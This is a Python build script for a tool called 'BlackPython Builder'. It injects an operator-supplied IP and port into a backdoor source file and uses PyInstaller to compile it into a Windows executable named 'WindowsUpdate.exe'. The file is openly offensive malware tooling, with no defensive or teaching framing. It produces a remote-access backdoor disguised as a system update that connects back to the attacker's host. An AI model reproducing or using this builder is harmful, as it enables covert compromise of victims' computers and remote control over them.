#!/usr/bin/env python3
import os
import glob
import shutil
import subprocess
from datetime import datetime

PAYLOAD_NAME = "WindowsUpdate"
OUTPUT_DIR = "build"
TEMP_DIR = os.path.join(OUTPUT_DIR, "temp")

def clean_previous():
    """Elimina builds anteriores"""
    for folder in [OUTPUT_DIR, "dist", TEMP_DIR]:
        if os.path.exists(folder):
            shutil.rmtree(folder)
    for f in glob.glob("*.spec"):
        os.remove(f)

def modify_backdoor_source(ip, port):
    """Modifica el archivo backdoor.py con la IP y puerto especificados"""
    backdoor_path = "core/backdoor.py"
    temp_backdoor_path = os.path.join(TEMP_DIR, "backdoor.py")  # Cambiado a .py
    
    with open(backdoor_path, "r", encoding='utf-8') as f:  # Added encoding
        content = f.read()
    
    content = content.replace(
        'def __init__(self, host="127.0.0.1", port=4444):',
        f'def __init__(self, host="{ip}", port={port}):'
    )
    
    os.makedirs(TEMP_DIR, exist_ok=True)
    with open(temp_backdoor_path, "w", encoding='utf-8') as f:  # Added encoding
        f.write(content)
    
    return temp_backdoor_path

def compile_payload(ip="127.0.0.1", port=4444):
    """Compila el payload para Windows"""
    print("[*] Compilando payload...")
    
    os.makedirs(TEMP_DIR, exist_ok=True)
    backdoor_file = modify_backdoor_source(ip, port)
    
    cmd = [
        "pyinstaller",
        "--onefile",
        "--console",
        "--name", PAYLOAD_NAME,
        "--distpath", OUTPUT_DIR,
        "--workpath", TEMP_DIR,
        "--specpath", TEMP_DIR,
        "--hidden-import", "http.client",
        "--hidden-import", "ssl",
        "--hidden-import", "json",
        "--hidden-import", "subprocess",
        "--hidden-import", "os",
        "--hidden-import", "time",
        "--hidden-import", "cryptography.fernet",
        backdoor_file
    ]
    
    try:
        subprocess.run(cmd, check=True)
        print(f"[+] Payload compilado: {OUTPUT_DIR}/{PAYLOAD_NAME}.exe")
    except subprocess.CalledProcessError as e:
        print(f"[!] Error durante la compilación: {str(e)}")
        exit(1)

def main():
    import argparse
    parser = argparse.ArgumentParser(description="BlackPython Builder")
    parser.add_argument("--ip", required=True, help="IP para el backdoor")
    parser.add_argument("--port", type=int, default=4444, help="Puerto para el backdoor")
    args = parser.parse_args()

    print(f"\n{'='*50}")
    print(f"  BlackPython Builder - {datetime.now().strftime('%Y-%m-%d %H:%M')}")
    print(f"{'='*50}")
    
    clean_previous()
    compile_payload(args.ip, args.port)
    
    print("\n[+] Proceso completado!")

if __name__ == "__main__":
    main()
